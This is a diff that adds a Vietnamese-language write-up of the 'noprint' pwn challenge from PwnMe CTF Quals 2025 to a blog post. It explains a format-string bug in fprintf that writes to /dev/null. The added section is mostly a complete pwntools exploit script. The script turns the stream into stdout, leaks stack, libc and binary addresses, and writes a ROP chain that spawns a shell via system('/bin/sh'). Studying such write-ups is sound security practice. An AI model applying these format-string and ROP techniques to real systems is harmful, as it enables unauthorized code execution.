@@ -2,7 +2,7 @@
 title: PwnMe CTF Quals 2025
 date: 2025-02-16 
 description : 'PWNME-2025'
-tags: ['pwn','writeup']
+tags: ['fsb','got']
 author: ['kuvee']
 draft: false
 ---
@@ -200,3 +200,229 @@ p.sendline(str(int(rbp-0x78)) + ' ' + str(int(0)))
 
 p.interactive()
 ```
+
+
+
+
+
+## noprint
+
+- bài rất ngắn , nói đơn giản là trước hết nó sẽ malloc và trả về 1 địa chỉ heap , sau đó ta sẽ nhập dữ liệu vào vùng heap này , cuối cùng là dùng `fprintf` để ghi dữ liệu vào /dev/null 
+
+```c
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  FILE *stream; // [rsp+20h] [rbp-10h]
+  char *buf; // [rsp+28h] [rbp-8h]
+
+  puts("Hello from the void");
+  init(argv, envp);
+  setbuf(_bss_start, 0);
+  setbuf(stdin, 0);
+  stream = fopen("/dev/null", "a");
+  for ( buf = (char *)malloc(0x100u); ; fprintf(stream, buf) )
+    buf[read(0, buf, 0x100u) - 1] = 0;
+}
+```
+
+- khó khăn thứ nhất của bài này là ta không thể đặt dữ liệu lên stack dễ dàng được , thứ hai là ta không thể leak bất cứ thứ gì vì nó đang ghi vào /dev/null  , vậy ta chỉ có thể write? ta phải làm như thế nào? 
+
+
+- có 2 cách để làm bài này : 
+
+    - cách 1 : ghi đè return address của `vfprintf_internal` -> dùng định dạng *
+    - cách 2 : thay đổi flags và fileno thành stdout -> có thể leak
+
+
+
+- ta sẽ bắt đầu với cách 1 trước: 
+
+offset của `rsp` ở bài này là 5 , và địa chỉ `0x55555555b6b0` sẽ chính là target của ta , ta sẽ cần thay đổi nó thành flags của stdout `0x00000000fbad2887` và `0x55555555b6b0+0x70` chính là fileno thành 1 
+
+![image](https://hackmd.io/_uploads/rJM_7cmJxx.png)
+
+- vì vậy ta sẽ cần kiếm các con trỏ trỏ đến nhau , và ở sau địa chỉ `libc_start_call_main` sẽ thích hợp để thực hiện việc này , ý tưởng của ta sẽ là sử dụng định dạng "*" để format string attack thay đổi giá trị tại offset đó thành `0x55555555b6b0+0x70` -> sau đó ta chỉ việc in ra 1 byte và ghi vào địa chỉ stack bên dưới , nó sẽ trông như sau: 
+
+```c
+s(b"%112c%*9$c%13$n".ljust(0x100, b"\0"))
+s(b".%21$lln".ljust(0x100, b"\0"))
+```
+
+- lúc này ta thấy ta đã ghi thành công địa chỉ fileno , tiếp theo ta chỉ việc thay đổi flags -> `stdout` là được 
+
+![image](https://hackmd.io/_uploads/BJ67H9m1el.png)
+
+
+- lúc này ta đã hoàn tất việc thay đổi filestream thành stdout
+
+![image](https://hackmd.io/_uploads/SySPHcQklg.png)
+
+
+- cuối cùng chỉ cần thực hiện tương tự để build rop_chain , ở đây ta sẽ ghi rop_chain vào rip+8 trong fprintf , cuối cùng là thêm 1 ret để nó ret vào rop_chain 
+
+exp:
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from subprocess import check_output
+from time import sleep
+
+from pwn import *
+
+context.terminal = [
+    "wt.exe",
+    "-w",
+    "0",
+    "split-pane",
+    "-d",
+    ".",
+    "wsl.exe",
+    "-d",
+    "kali-linux",
+    "--",
+    "bash",
+    "-c",
+]
+context.update(arch="amd64", os="linux")
+context.log_level = "debug"
+exe = context.binary = ELF("./noprint_patched", checksec=False)
+libc = exe.libc
+log_levels = ["info", "error", "warn", "debug"]
+info = lambda msg: log.info(msg)
+error = lambda msg: log.error(msg)
+warn = lambda msg: log.warn(msg)
+debug = lambda msg: log.debug(msg)
+
+
+def one_gadget(filename, base_addr=0):
+    return [
+        (int(i) + base_addr)
+        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
+        .decode()
+        .split(" ")
+    ]
+
+
+info = lambda msg: log.info(msg)
+s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
+sa = lambda msg, data, proc=None: (
+    proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
+)
+sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
+sla = lambda msg, data, proc=None: (
+    proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
+)
+sn = lambda num, proc=None: (
+    proc.send(str(num).encode()) if proc else p.send(str(num).encode())
+)
+sna = lambda msg, num, proc=None: (
+    proc.sendafter(msg, str(num).encode())
+    if proc
+    else p.sendafter(msg, str(num).encode())
+)
+sln = lambda num, proc=None: (
+    proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
+)
+slna = lambda msg, num, proc=None: (
+    proc.sendlineafter(msg, str(num).encode())
+    if proc
+    else p.sendlineafter(msg, str(num).encode())
+)
+
+
+def logbase():
+    log.info("libc base = %#x" % libc.address)
+
+
+def rcu(d1, d2=0):
+    p.recvuntil(d1, drop=True)
+    # return data between d1 and d2
+    if d2:
+        return p.recvuntil(d2, drop=True)
+
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(1)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(
+            int(pid),
+            gdbscript=gdbscript
+            + f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe",
+            exe=exe.path,
+        )
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+
+gdbscript = """
+brva 0x0000000000001381
+brva 0x00000000000013A7
+c
+"""
+
+p = start()
+
+# ==================== EXPLOIT ====================
+
+
+def exploit():
+    p.recvline()
+    input()
+    s(b"%112c%*9$c%13$n".ljust(0x100, b"\0"))
+    s(b".%21$lln".ljust(0x100, b"\0"))
+    s(f"%{0x2887}c%9$hn".encode().ljust(0x100, b"\0"))
+
+    p.send(b"%11$p %12$p %16$p %50c".ljust(0x100, b"\x00"))
+    p.recvuntil(b"0x")
+    stack = int(p.recvuntil(b" "), 16) - 0xD8
+    libc.address = int(p.recvuntil(b" "), 16) - 0x2A3B8
+    exe.address = int(p.recvuntil(b" "), 16) - 0x12E4
+    info(f"stack= {hex(stack)} libc: {hex(libc.address)} exe: {hex(exe.address)}")
+    pop_rdi = libc.address + 0x00000000000CEE4D
+    bin_sh = next(libc.search(b"/bin/sh\x00"))
+    system = libc.sym.system
+    info(f"bin_sh: {hex(bin_sh)}")
+    info(f"system: {hex(system)}")
+    info(f"pop: {hex(pop_rdi)}")
+
+    ret = exe.address + 0x12E3
+
+    def write_v(target, val):
+        p.send(f"%{target&0xffff}c%11$hhn".encode().ljust(0x100, b"\0"))
+        p.send(f"%{val&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))
+        p.send(f"%{(target+2)&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
+        p.send(f"%{(val>>16)&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))
+        p.send(f"%{(target+4)&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
+        p.send(f"%{(val>>32)&0xffff}c%31$n".encode().ljust(0x100, b"\0"))
+
+    sleep(0.5)
+    p.send(f"%{stack&0xffff}c%11$hn".encode().ljust(0x100, b"\0"))
+    sleep(0.5)
+    write_v(stack + 8, pop_rdi)
+    sleep(0.5)
+    write_v(stack + 16, bin_sh)
+    sleep(0.5)
+    write_v(stack + 24, system)
+    sleep(0.5)
+    p.send(f"%{stack&0xff}c%11$hhn".encode().ljust(0x100, b"\0"))
+    sleep(0.5)
+    p.send(f"%{ret&0xffff}c%31$hn".encode().ljust(0x100, b"\0"))
+
+    p.interactive()
+
+
+if __name__ == "__main__":
+    exploit()
+
+```
+
+cách 2 ta có thể xem ở đây: https://robbert1978.github.io/2025/03/02/2025-3-3-PwnMe-Quals-2025/
